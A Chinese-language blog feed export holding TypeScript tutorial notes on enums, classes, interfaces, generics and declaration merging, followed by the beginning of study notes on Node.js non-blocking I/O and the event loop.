实际上已经帮你做了很多类型判断的工作了，比如： 12Math.pow(10,'2');// error TS2345: Argument of type '"2"' is not assignable to parameter of type 'number'. 上面的例子中，Math.pow 必须接受两个 number 类型的参数。事实上 Math.pow 的类型定义如下： 12345678interface Math &#123; /** * Returns the value of a base expression taken to a specified power. * @param x The base value of the expression. * @param y The exponent value of the expression. */ pow(x: number, y: number): number;&#125; 再举一个 DOM 中的例子： 1234document.addEventListener('click',function(e:MouseEvent)&#123; console.log(e.targetCurrent);&#125;);// error TS2339: Property 'targetCurrent' does not exist on type 'MouseEvent'. 上面的例子中，addEventListener 方法是在 TypeScript 核心库中定义的： 123interface Document extends Node, GlobalEventHandlers, NodeSelector, DocumentEvent &#123; addEventListener(type: string, listener: (ev: MouseEvent) =&gt; any, useCapture?: boolean): void;&#125; 所以 e 被推断成了 MouseEvent，而 MouseEvent 是没有 targetCurrent 属性的，所以报错了。注意，TypeScript 核心库的定义中不包含 Node.js 部分。 用 TypeScript 写 Node.jsNode.js 不是内置对象一部分，如果想用 TypeScript 写 Node.js，则需要引入第三方声明文件： 1npm i @types/node -S -D 进阶本部分介绍一些高级的类型与技术，具体内容包括： 类型别名 字符串字面量类型 元组 枚举 类 类与接口 泛型 声明合并 类型别名类型别名可以用个一个类型起新名字 简答的例子 12345678910type Name = string;type NameResolver = ()=&gt; string;type NameOrResolver = Name | NameResolver;function getName(n: NameOrResolver): Name&#123; if(typeof n === 'string')&#123; return n; &#125;else &#123; return n(); &#125;&#125; 上例中，我们使用 type创建类型别名。 类型别名常用于联合类型。 字符串字面量类型字符串字面量类型用来约束取值只能是某几个字符串中的一个 简单的例子1234567type EventNames = 'click' | 'scroll' | 'mouseover';function handleEvent(ele:Element,event:EventNames)&#123; // do something&#125;handleEvent(document.getElementById('hello'),'scroll');handleEvent(document.getElementById('world'),'dbclick');// Argument of type '"dbclick"' is not assignable to parameter of type 'EventNames'. 上例中，我们使用 type定了字符串字面量类型 EventNames,它只能取三种字符串中的一种 注意，类型别名与字符串字面量类型都是使用 type进行定义 元组数组合并了相同类型的对象，而元组（Tuple）合并了 不同类型的对象 元组起源于函数编程语言（如 F#），在这些语言中频繁地使用元组。 简单的例子定义一值分别为 string 和 number的元组： 1let lbh : [string, number] = ['lbh',23]; 当赋值或访问一个已知索引的元素时，会得到正确的类型： 12345let lbh : [string, number];lbh[0] = 'l bh'lbh[1] = 25;lbh[0].slice(1);lbh[1].toFixed(1); 也可以只赋值其中一项： 12let lbh : [string, number];lbh[0] = 'l bh' 但是当直接对元组类型的变量进行初始化或者赋值的时候，需要提供所有元组类型中指定的项： 12let lbh: [string,number] = ['l bh'];// error TS2322: Type '[string]' is not assignable to type '[string, number]'.Property '1' is missing in type '[string]'. 1234let lbh: [string,number];lbh = ['l bh'];xcatliu[1] = 25;// TS2322: Type '[string]' is not assignable to type '[string, number]'.Property '1' is missing in type '[string]'. 越界的元素当添加越界的元素时，它的类型会被限制为元组中的每个类型的联合类型： 12345let lbh: [string,number];lbh = ['lbh',23];lbh.push('http://laibh.top');lbh.push(true);// error TS2345: Argument of type 'true' is not assignable to parameter of type 'string | number'. 枚举枚举（Enum）类型用于取值被限定在一定的范围内的场景，比如一周只能有七天，颜色限定为红蓝绿等。 简单的例子枚举使用 enum关键字来定义： 1enum Days&#123;Sun,Mon,Tue,Web,Thu,Fri,Sat&#125;; 编译后： 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 0] = "Sun"; Days[Days["Mon"] = 1] = "Mon"; Days[Days["Tue"] = 2] = "Tue"; Days[Days["Web"] = 3] = "Web"; Days[Days["Thu"] = 4] = "Thu"; Days[Days["Fri"] = 5] = "Fri"; Days[Days["Sat"] = 6] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); 枚举对象会被赋值为从 0开始递增的数字，同时也会被枚举值到枚举名进行反向映射: 1234567891011enum Days &#123;Sun, Mon, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 0); // trueconsole.log(Days["Mon"] === 1); // trueconsole.log(Days["Tue"] === 2); // trueconsole.log(Days["Sat"] === 6); // trueconsole.log(Days[0] === "Sun"); // trueconsole.log(Days[1] === "Mon"); // trueconsole.log(Days[2] === "Tue"); // trueconsole.log(Days[6] === "Sat"); // true 手动赋值 我们也可以给枚举项手动赋值： 123456enum Days &#123;Sun = 7, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 7); // trueconsole.log(Days["Mon"] === 1); // trueconsole.log(Days["Tue"] === 2); // trueconsole.log(Days["Sat"] === 6); // true 上面例子中，未手动赋值的枚举项会接着上一个枚举递增。 如果未手动赋值的枚举项与手动赋值的重复了，TypeScript 是不会察觉到这一点的： 123456enum Days &#123;Sun = 3, Mon = 1, Tue, Wed, Thu, Fri, Sat&#125;;console.log(Days["Sun"] === 3); // trueconsole.log(Days["Wed"] === 3); // trueconsole.log(Days[3] === "Sun"); // falseconsole.log(Days[3] === "Wed"); // true 上面的例子中，递增到 3 的时候与前面的 Sun 的取值重复了，但是 TypeScript 并没有报错，导致 Days[3] 的值先是 &quot;Sun&quot;，而后又被 &quot;Wed&quot; 覆盖了。编译的结果是： 12345678910var Days;(function (Days) &#123; Days[Days[&quot;Sun&quot;] = 3] = &quot;Sun&quot;; Days[Days[&quot;Mon&quot;] = 1] = &quot;Mon&quot;; Days[Days[&quot;Tue&quot;] = 2] = &quot;Tue&quot;; Days[Days[&quot;Wed&quot;] = 3] = &quot;Wed&quot;; Days[Days[&quot;Thu&quot;] = 4] = &quot;Thu&quot;; Days[Days[&quot;Fri&quot;] = 5] = &quot;Fri&quot;; Days[Days[&quot;Sat&quot;] = 6] = &quot;Sat&quot;;&#125;)(Days || (Days = &#123;&#125;)); 所以使用的时候需要注意，最好不要出现这种覆盖的情况。 手动赋值的枚举项可以不是数字，此时需要使用类型断言来让tsc无视类型检查 (编译出的js仍然是可用的)： 1enum Days &#123;Sun = 7, Mon, Tue, Wed, Thu, Fri, Sat = &lt;any&gt;"S"&#125;; 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 7] = "Sun"; Days[Days["Mon"] = 8] = "Mon"; Days[Days["Tue"] = 9] = "Tue"; Days[Days["Wed"] = 10] = "Wed"; Days[Days["Thu"] = 11] = "Thu"; Days[Days["Fri"] = 12] = "Fri"; Days[Days["Sat"] = "S"] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); 当然，手动赋值的枚举项也可以为小数或者是负数，此时后续未手动赋值的低增长仍为 1: 1enum Days &#123;Sun = 7,Mon = 1.5,Tue, Wed, Thu, Fri, Sat&#125; 12345678910var Days;(function (Days) &#123; Days[Days["Sun"] = 7] = "Sun"; Days[Days["Mon"] = 1.5] = "Mon"; Days[Days["Tue"] = 2.5] = "Tue"; Days[Days["Wed"] = 3.5] = "Wed"; Days[Days["Thu"] = 4.5] = "Thu"; Days[Days["Fri"] = 5.5] = "Fri"; Days[Days["Sat"] = 6.5] = "Sat";&#125;)(Days || (Days = &#123;&#125;)); 常数项和计算所得项 枚举项有两种类型：常数项（constant member）和 （computed member） 前面我们所举的例子都是常数项，一个典型的计算所得项的例子： 1enum Color &#123; Red, Green, Blue = 'blue'.length&#125; 上面的例子中，&quot;blue&quot;.length 就是一个计算所得项。 上面的例子不会报错，但是如果紧接着在计算所得项后面是未手动赋值的项，那么它就会因为无法取得初始值而报错： 12enum Color &#123; Blue = 'blue'.length,Red, Green &#125;// error TS1061: Enum member must have initializer. 下面是常数项和计算所得项的完整定义，部分引用自中文手册 - 枚举： 当满足以下条件时，枚举成员被当作是常数： 不具有初始化函数并且之前的枚举成员是常数。在这种情况下，当前枚举成员的值为上一个枚举成员的值加 1。但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 0。 枚举成员使用常数枚举表示式初始化。常数枚举表达式是 TypeScript 表达式的子集，它可以在编译阶段求值。当一个表示式满足下面的之一时，它就是一个常数枚举表达式： 数字字面量 应用之前定义的常数枚举成员（可以在不同的枚举类型中定义的）如果这个成员是在同一枚举类型中定义的，可以使用非限定名来引用 带括号的常数枚举表达式 +, -, ~ 一元运算符应用于常数枚举表达式 +, -, *, /, %, &lt;&lt;, &gt;&gt;, &gt;&gt;&gt;, &amp;, |, ^ 二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为NaN或Infinity，则会在编译阶段报错 所有其它情况的枚举成员被当作是需要计算得出的值。 常数枚举常数枚举是使用 const enum定义的枚举类型： 123456const enum Directions &#123; Up, Down, Left, Right&#125; 常数枚举与普通枚举的区别是，它会在编译阶段被删除，并且不能删除计算成员 上面编译的结果是： 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; 假如包含了计算成员，则会在编译阶段报错： 12const enum Color &#123; Red, Green, Blue = 'blue'.length &#125;;// error TS2474: In 'const' enum declarations member initializer must be constant expression. 外部枚举外部枚举（Ambient Enums）是使用 declare enum定义的枚举类型： 1234567declare enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; declare定义的类型只会用于编译时的检查，编译结果中会被删除 1var directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 外部枚举与声明语句一样，常出现在声明文件中。 同时使用 declare和 const也是可以的： 1234567declare const enum Directions &#123; Up, Down, Left, Right&#125;let directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 编译结果： 1var directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */]; TypeScript 的枚举类型的概念来源于 C#。 类传统的方法中，JavaScript 通过构造函数实现类的概念，通过原型链实现继承。 ypeScript 除了实现了所有 ES6 中的类的功能以外，还添加了一些新的用法。 这一节主要介绍类的用法，下一节再介绍如何定义类的类型。 类的概念 类（Class）:定义一件事物的抽象特点，包含它的属性和方法 对象（Object）:类的实例，通过 new生成 面向对象（OOP）的三大特性：封装、继承、多态 封装（Encapsulation）:将对数据的操作细节隐藏起来，只暴露对外的接口。外界调用端不需要知道细节，就能通过对外提供的接口来访问该对象，同时也保证了外界无法任意更改对象内部的数据。 继承（Inheritance）:子类继承父类，子类除了拥有父类的所有特征外，还有一些更具体的特性 多态（Polymorphism）:由继承而产生了相关的不同的类，对同一个方法可以有不同的响应。比如 cat和 Dog都继承自 Animal，但是分别实现了自己的 eat 方法。此时针对某一个实例，我们无需了解它是 Cat 还是 Dog，就可以直接调用 eat 方法，程序会自动判断出来应该如何执行 eat 存取器（getter&amp;setter）:用以改变属性的读取和赋值行为 修饰符（Modifiers）:修饰符是一些关键字，用于限定成员或类型的性质。比如 public表示公共属性或方法 抽象类（Abstraces）:抽象类是供其他类继承的基类，抽象类不允许被实例化。抽象类中的抽象方法必须在子类中被实现 接口（Interfaces）:不同类之间共有的属性或方法，可以抽象成一个接口。接口可以被实现（implements）。一个类只能继承自另一个类，但是可以实现多个接口。 ES6中类的用法下面我们先回顾一下 ES6 中类的用法，更详细的介绍可以参考 ECMAScript 6 入门 - Class。 属性和方法使用 class定义类，使用 constructor定义构造函数。 通过 new生成新的实例的时候，会自动调用构造函数。 1234567891011class Animal &#123; constructor(name) &#123; this.name = name; &#125; sayHi() &#123; return `My name is $&#123;this.name&#125;`; &#125;&#125;let a = new Animal('Jack');console.log(a.sayHi()); // My name is Jack 类的继承使用 extends关键字实现继承，子类中使用 super关键字来调用父类的构造函数和方法 123456789101112class Cat extends Animal &#123; constructor(name)&#123; super(name); // 调用父类的 constructor(name) console.log(this.name); &#125; sayHi()&#123; return `Meow,`+super.sayHi(); // 调用父类的 sayHi() &#125;&#125;let c = new Cat('Tom');console.log(c.sayHi()); // Meow,My name is Tom 存储器使用 getter 和 setter 可以改变属性的赋值和读取行为： 1234567891011121314151617class Animal &#123; constructor(name)&#123; this.name = name; &#125; sayHi()&#123; return `My name is $&#123;this.name&#125;` &#125; get name()&#123; return this.name; &#125; set name(value)&#123; console.log('setter: '+ value); &#125;&#125;let a = new Animal('Kitty'); // setter: Kittya.name = 'Tom'; // setter: Tomconsole.log(a.name); // Jack 静态方法使用 static修饰符修饰的方法被称为静态方法，他们不需要实例化，而是直接通过类来调用： 123456789class Animal &#123; static isAnimal(a) &#123; return a instanceof Animal; &#125;&#125;let a = new Animal('Jack');Animal.isAnimal(a); // truea.isAnimal(a); // TypeError: a.isAnimal is not a function ES7中类的用法ES7中有一些关于类的提案，TypeScript 也实现了它们。 实例属性ES6中实例的属性只能通过构造函数中的 this.xx来定义，ES7提案可以直接在类里面定义： 12345678class Animal&#123; name = 'Jack'; constructor()&#123; // ... &#125;&#125;let a = new Animal();console.log(a.name); // Jack 静态属性ES7提案中，可以使用 static定义一个静态属性 1234567class Animal &#123; static num = 42; constructor()&#123; //... &#125;&#125;console.log(Animal.num); // 42 TypeScript 中 类的用法public private 和 protectedTypeScripy 可以使用三种访问修饰符（Access Modifiers），分别是 public、private和 protected。 public修饰的属性或方法是共有的，可以在任何地方被访问到，默认所有的属性和方法都是 public private修饰的属性和方法都是私有的，不能在声明它的类的外部访问 protected修饰的属性和方法是受保护的，它和 private类似，区别是它在子列中也是允许被访问的。 例子： 1234567891011class Animal&#123; public name; public constructor(name)&#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';console.log(a.name); // Tom 上面的例子中， name被设置为 public，所以直接访问实例的 name属性是被允许的。很多时候，我们希望的属性是无法直接存取的，这时候就可以用 private了： 123456789101112class Animal &#123; private name; public constructor(name)&#123; this.name = name; &#125;&#125;let a = new Animal('Jack');console.log(a.name); // Jacka.name = 'Tom';// index.ts(9,13): error TS2341: Property 'name' is private and only accessible within class 'Animal'.// index.ts(10,1): error TS2341: Property 'name' is private and only accessible within class 'Animal'. 需要注意的是，TypeScirpt 编译之后的代码中，并没有限制 private属性在外部的可访问性； 上面代码的编译结果是： 123456789var Animal = (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;());var a = new Animal('Jack');console.log(a.name);a.name = 'Tom'; 使用 private修饰的属性或方法，在子类中不允许访问的： 12345678910111213class Animal &#123; private name; public constructor(name)&#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name)&#123; super(name); console.log(this.name); &#125;&#125;// error TS2341: Property 'name' is private and only accessible within class 'Animal'. 而如果是用 protected修饰，则运行在子类中访问： 12345678910111213class Animal &#123; protected name; public constructor(name)&#123; this.name = name; &#125;&#125;class Cat extends Animal &#123; constructor(name)&#123; super(name); console.log(this.name); &#125;&#125; 抽象类abstract用于定义抽象类和其中的抽象方法。 什么是抽象类？ 首先，抽象类是不允许被实例化的: 12345678910abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;let a = new Animal('jack');// error TS2511: Cannot create an instance of an abstract class. 上面的例子中，我们定义了一个抽象类 Animal，并且定义了一个抽象的方法 sayHi。在实例化类的时候报错了。 其次，抽象类中的抽象方法必须被子类实现： 12345678910111213141516abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public eat()&#123; console.log(`$&#123;this.name&#125; is eating`); &#125;&#125;let cat = new Cat('Tom');// error TS2515: Non-abstract class 'Cat' does not implement inherited abstract member 'sayHi' from class 'Animal'. 上面的例子中，我们定义了一个类 cat继承了抽象类 Animal，但是没有实现抽象方法 sayHi，所以编译报错了。 下面是一个正确使用抽象类的例子： 123456789101112131415161718abstract class Animal &#123; public name; public constructor(name)&#123; this.name = name; &#125; public abstract sayHi();&#125;class Cat extends Animal &#123; public sayHi()&#123; console.log(`My name is $&#123;this.name&#125;`); &#125; public eat()&#123; console.log(`$&#123;this.name&#125; is eating`); &#125;&#125;let cat = new Cat('Tom'); 上面的例子中，我们实现了抽象方法 sayHi，编译通过了。 需要注意的是，即便是抽象方法，TypeScript 的编译结果中，仍然会有这个类，上面的代码的编译结果是： 123456789101112131415161718192021222324252627282930313233var __extends = (this &amp;&amp; this.__extends) || (function () &#123; var extendStatics = function (d, b) &#123; extendStatics = Object.setPrototypeOf || (&#123; __proto__: [] &#125; instanceof Array &amp;&amp; function (d, b) &#123; d.__proto__ = b; &#125;) || function (d, b) &#123; for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; &#125;; return extendStatics(d, b); &#125; return function (d, b) &#123; extendStatics(d, b); function __() &#123; this.constructor = d; &#125; d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __()); &#125;;&#125;)();var Animal = /** @class */ (function () &#123; function Animal(name) &#123; this.name = name; &#125; return Animal;&#125;());var Cat = /** @class */ (function (_super) &#123; __extends(Cat, _super); function Cat() &#123; return _super !== null &amp;&amp; _super.apply(this, arguments) || this; &#125; Cat.prototype.sayHi = function () &#123; console.log("My name is " + this.name); &#125;; Cat.prototype.eat = function () &#123; console.log(this.name + " is eating"); &#125;; return Cat;&#125;(Animal));var cat = new Cat('Tom'); 类的类型给 类加上 TypeScript 的类型很简单，与接口相似： 1234567891011class Animal &#123; name: string; constructor(name: string)&#123; this.name = name; &#125; sayHi():string&#123; return `My name is $&#123;this.name&#125;` &#125;&#125;let a:string Animal = new Animal('Jack');console.log(a.sayHi()); // My name is Jack 类与接口接口（Interfaces）可以用于对「对象的形状（Shape）」进行描述。 这一章主要介绍接口的另一个用途，对类一部分行为进行抽象。 类实现接口实现（implements）是面向对象中的一个重要的概念。一般来讲，一个类继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 implements关键字来实现，这个特性大大提高了面向对象的灵活性。 举例来说，门是一个类，防盗门是门的子类。如果防盗门有个报警器的功能，我们可以简单的给防盗门加一个报警方法。这时候如果有另外一个类，车，也有报警的功能，就可以考虑把报警器提取出来，作为一个接口，防盗门和车都去实现它: 123456789101112131415interface Alarm &#123; alert();&#125;class Door&#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert()&#123; console.log('SecurityDoor alert'); &#125;&#125;class Car implements Alarm &#123; alert()&#123; console.log('car alert'); &#125;&#125; 一个类可以实现多个接口： 12345678910111213141516171819202122232425interface Alarm &#123; alert();&#125;interface Light &#123; lightOn(); lightOff();&#125;class Door&#123;&#125;class SecurityDoor extends Door implements Alarm &#123; alert()&#123; console.log('SecurityDoor alert'); &#125;&#125;class Car implements Alarm,Light &#123; alert()&#123; console.log('car alert'); &#125; lightOff()&#123; console.log('Car light off'); &#125; lightOn()&#123; console.log('Car lightOn'); &#125;&#125; 上例中，Car实现了 Alarm和 Light接口，即能报警，也能开关车灯。 接口继承接口接口与接口之间也是可以继承的： 1234567interface Alarm &#123; alert();&#125;interface LightableAlarm extends Alarm &#123; lightOn(); lightOff();&#125; 上例中，我们使用 extends使 LightableAlarm继承 Alarm 接口继承类接口也可以继承类： 123456789class Point &#123; x: number; y: number;&#125;interface Point3d extends Point &#123; z: number;&#125;let point3d: Point3d = &#123;x:1, y:2, z:3&#125; 混合类型可以使用接口的方式来顶一个函数需要符合的形状： 1234567interface SearchFunc &#123; (source: string, subString: string) : boolean;&#125;let mySearchFunc:SearchFunc;mySearchFunc = function(source: string, subString: string) : boolean&#123; return source.search(subString) !== -1;&#125; 有时候，一个函数还可以有自己的属性和方法： 1234567891011121314151617interface Couter &#123; (start: number): string; interval :number; reset(): void;&#125;function getCounter() :Couter &#123; let counter = &lt;Couter&gt;function (start: number)&#123;&#125; counter.interval = 123; counter.reset = function()&#123;&#125; return counter;&#125;let c = getCounter();c(10);c.reset();c.interval = 0.5; 泛型泛型（Generics）是指在定义函数、接口或类的时候，不预先指定具体的类型，而在使用的时候再指定类型的一种特性。 简单的例子首先，我们实现一个函数 createArray，它可以创建一个指定长度的数组，同时将每一项都填充一个默认值： 12345678function createArray(length: number, value: any):Array&lt;any&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3,'x'); 上例中，我们使用了之前提到过的数组泛型来定义返回值的类型。 这段代码的编译不会报错，但是一个显而易见的错误是，它并没有准确的定义返回值的类型： Array&lt;any&gt;运行数组的每一项都为任意类型。但是我们预期的是，数组中每一项都应该是输入 value的类型； 这时候，泛型就派上用处了： 12345678function createArray&lt;T&gt;(length: number,value:T):Array&lt;T&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray&lt;string&gt;(3, 'x');// ['x', 'x', 'x'] 上例中，我们在函数后面添加了 &lt;T&gt;,其中 T用来指代任意输入的类型，在后面的输入 value：T和 输出的 Array&lt;T&gt;中即可使用了。 接着在调用到时候，可以指定它具体的类型为 string,当然，也可以不手动指定，而然类型自动推算出来： 12345678function createArray&lt;T&gt;(length: number,value:T):Array&lt;T&gt;&#123; let result = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x');// ['x', 'x', 'x'] 多个类型参数定义泛型的时候，可以一次定义多个类型参数： 1234function swap&lt;T,U&gt;(tuple:[T,U]):[U,T]&#123; return [tuple[1],tuple[0]]; &#125;swap([7,'seven']); // ['seven',7] 上面我们定义了一个 swap函数用来交换输入的元组。 泛型约束在函数内部使用泛型变量的时候，由于事先不知道它是哪种类型，所以不能随意的操作它的属性或方法： 12345function loggingIdentity&lt;T&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125;// error TS2339: Property &apos;length&apos; does not exist on type &apos;T&apos;. 上例中，泛型 T不一定包含属性 length，所以编译的时候报错了。 这时，我们可以对泛型进行约束，只允许这个函数传入那些包含 length属性的变量。这就是泛型约束： 1234567interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125; 上例中，我们使用 extends约束了泛型 T必须符合接口 Lengthwise的形状，也就是必须包含 length属性。 此时如果调用了 loggingIdentity的时候，出入的 arg不包含 length，那么在编译阶段就会报错了： 12345678910interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg:T):T&#123; console.log(arg.length); return arg;&#125;loggingIdentity(7);// error TS2345: Argument of type '7' is not assignable to parameter of type 'Lengthwise'. 多个类型参数之间也可以互相约束： 123456789function copyFields&lt;T extends U,U&gt;(target: T, source: U):T&#123; for(let id in source)&#123; target[id] = (&lt;T&gt;source)[id]; &#125; return target;&#125;let x = &#123; a: 1, b: 2, c: 3,d: 4 &#125;;copyFields(x,&#123;b:10, d:20&#125;); // &#123;a: 1, b: 10, c: 3, d: 20&#125; 上例中，我们使用了两个类型参数，其中要求 T 继承 U，这样就保证了 U 上不会出现 T 中不存在的字段。 泛型接口可以使用接口的方式来定义一个函数需要符合的形状： 12345678interface SearchFunc &#123; (source: string, subString: string): boolean; &#125; let mySearch: SearchFunc; mySearch = function(source: string, subString: string) &#123; return source.search(subString) !== -1; &#125; 当然也可以使用含有泛型的接口来定义函数的形状： 12345678910111213interface CreateArrayFunc &#123; &lt;T&gt;(length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt;&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); 进一步，我们可以把泛型参数提前到接口名上： 12345678910111213interface CreateArrayFunc&lt;T&gt; &#123; (length: number, value: T): Array&lt;T&gt;;&#125;let createArray: CreateArrayFunc&lt;any&gt;;createArray = function&lt;T&gt;(length: number, value: T): Array&lt;T&gt;&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125;createArray(3, 'x'); 注意，此时在使用泛型接口的时候，需要定义泛型的类型。 泛型类与泛型接口类似，泛型也可以用于类的类型定义中： 12345678class GenericNumber&lt;T&gt; &#123; zeroValue: T; add: (x: T, y: T) =&gt; T;&#125;let myGenericNumber = new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue = 0;myGenericNumber.add = function(x,y)&#123;return x + y &#125; 泛型参数的默认类型在 TypeScript 2.3 以后，我们可以为泛型中的类型参数指定默认类型。当使用泛型时没有在代码中直接指定类型参数，从实际值参数中也无法推测出时，这个默认类型就会起作用。 1234567function createArray&lt;T = string&gt;(length: number, value: T)&#123; let result: T[] = []; for(let i = 0; i &lt; length; i++)&#123; result[i] = value; &#125; return result;&#125; 声名合并如果定义了两个相同名字的函数、接口或类，那么它们会合并成一个类型： 函数的合并我们可以使用重载定义多个函数类型： 123456789function reverse(x:number):number;function reverse(x:string):string;function reverse(x:number|string):number|string&#123; if(typeof x === 'number')&#123; return Number(x.toString().split('').reverse().join('')); &#125;else if(typeof x === 'string')&#123; return x.split('').reverse().join(''); &#125;&#125; 接口的合并接口中的属性在合并时会简单的合并到一个接口中： 123456interface Alarm &#123; price: number;&#125;interface Alarm &#123; weight: number;&#125; 相当于： 1234interface Alarm &#123; price: number; weight: number;&#125; 注意，合并的属性的类型必须是唯一的 1234567interface Alarm &#123; price: number;&#125;interface Alarm &#123; price: number; // 虽然重复了，但是类型都是 'string',不会报错 weight: number;&#125; 12345678interface Alarm &#123; price: number;&#125;interface Alarm &#123; price: string; // 类型不一致，报错 weight: number;&#125;// error TS2717: Subsequent property declarations must have the same type. Property 'price' must be of type 'number', but here has type 'string'. 接口中方法和合并，与函数的合并一样。 12345678interface Alarm &#123; price: number; alert(s: string): string;&#125;interface Alarm &#123; weight: number; alert(s: string, n: number): string;&#125; 相当于 123456interface Alarm &#123; price: number; weight: number; alert(s: string): string; alert(s: string, n: number): string;&#125; 类的合并类的和并与接口的合并规则一致 代码检查 点击这里]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 欢迎进入Nodejs的世界]]></title>
    <url>%2F2018-11-28-NodeJs2-Part1.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 欢迎进入Nodejs的世界一个典型的Node Web 应用程序大体上来说，Node和JavaScript的优势之一是它们的单线程编程模型。在为浏览器编写代码时，我们写的指令序列一次执行一条，代码不是并行执行。然后对于用户界面来说，这样是不合理的：没有哪个用户想在浏览器执行网络访问或文件获取这样的低速操作时干等着。为了解决这个问题，浏览器引入了事件机制：在你点击按钮时，就有一个事件被触发，还有一个之前定义的函数会跑起来。这种机制可以规避一些线程编程中经常出现的问题，比如资源死锁和竞态条件。 非阻塞I/O在服务端编程中，访问磁盘和网络这样的I/O请求会比较慢。Node用三种技术来解决这个问题：时间、异步API、非阻塞I/O。非阻塞I/O是底层术语，你的程序可以在做其他事件时发起一个请求来获取网络资源，然后当网络操作完成时，将会运行一个回调函数来处理这个操作的结果。 上图展示了一个典型的 Node Web 应用程序，它用Web 应用库Express来处理商店的订单流程。为了购买产品，浏览器发起了一个请求，然后应用程序检查库存，为用户创建一个账号，发回执邮件，并返回一个JSON HTTP 响应给浏览器。同时在做的其他事件有：发送了一封回执邮件，更新了数据库来保存用户的详细消息和订单。运行平台是并发操作的，因为它用了非阻塞I/O。 数据库是通过网络访问的。Node中的网络访问也是非阻塞的。用了 libuv 库来访问操作系统的非阻塞网络操作。在Linux/macOS/Windows 中的实现时不同的，但是我们只需要会操作数据库的 JavaScript 库就好了。例如 1db.insert(query,err =&gt; &#123;&#125;); 然后，Node 就会帮你完成那些经过高度优化的非阻塞网络操作。 访问硬盘也差不多，但又不完全一样。在生成了回执邮件并从硬盘中读取邮件模板时，libuv借助线程池模拟出了一种使用非阻塞调用的假象。管理线程池是个苦差事，想较而言， 1email.send('template.ejs',(err,html) =&gt; &#123;&#125;); 上面这样的代码就要容易理解得多了。 在进行速度较慢的处理时让Node能够做其他事情，是使用带非阻塞I/O的异步API真正的好处，即使你只有一个单线程、单线程的Node Web 应用，它也可以同时处理上千个网络访客发起的连接。要知道Node是怎么做到的，得先研究一下事件轮询。 事件轮询仔细研究上图的“响应浏览器的请求”的那部分。在这个应用程序中，Node内置了HTTP服务器库，即核心模块 http.server ，负责用流、事件、Node的HTTP请求解析器的组合来处理请求，是本地代码。可以使用Express Web 应用库添加的回调函数，也是由它触发的。这个回调函数又会触发数据查询语句，最终应用程序会用 HTTP 发送 JSON 作为响应。整个过程用了三个非阻塞网络调用：一个用于请求，一个用于数据库，还有一个用于响应。Node 是如何调用这些网络操作的呢？由事件轮询（event loop）。下图展示了如何用事件轮询完成这三个网络操作。 事件轮询是单向运行的先入先出队列，它要经过几个阶段，轮询中每个迭代都要运行的重要阶段在上图展示出来了。首先是计时器开始执行，这些计时器都是用 JavaScript 函数 setTimeout 和 setInterval 安排好的。接下来是运行 I/O 回调，即触发你的回调函数。轮询阶段会去获取新的I/O事件，最后是用 setImmediate 安排回调。这是一个特例，因为它允许你将回调安排在当前队列中的I/O回调完成之后立即执行。 ES2105、Node和V8从Node6开始可以使用默认函数参数、剩余参数、spread操作符、for…of循环、模块字符串、结构、生成器等很多新特征。点击这里 查看Node支持的ES2015特性。 在ES5及之前，我们使用 prototype 对象来创建类似类的结构： 123456function User()&#123; // 构造器&#125;User.prototype.method = function()&#123; // 方法&#125; Node6和ES2015，写成 1234class User()&#123; constructor()&#123;&#125; method()&#123;&#125;&#125; Node还支持了子类、超类和静态方法。 const 和 let 是从Node 4 开始支持的。Node 还有原生的 promise 和 生成器。 1[1,2,3].map(n =&gt; n*2).filter(n =&gt; n &gt; 3) 生成器能把异步I/O变成同步编程分隔。Koa Web 应用库中用到了生成器。Koa使用promise 和其他生成器就可以抛开层层嵌套的回调，在值上 yield。 ES2105的模板字符串在Node中也非常好用。 123456this.body = ` &lt;div&gt; &lt;h1&gt;Hello&lt;/h1&gt; 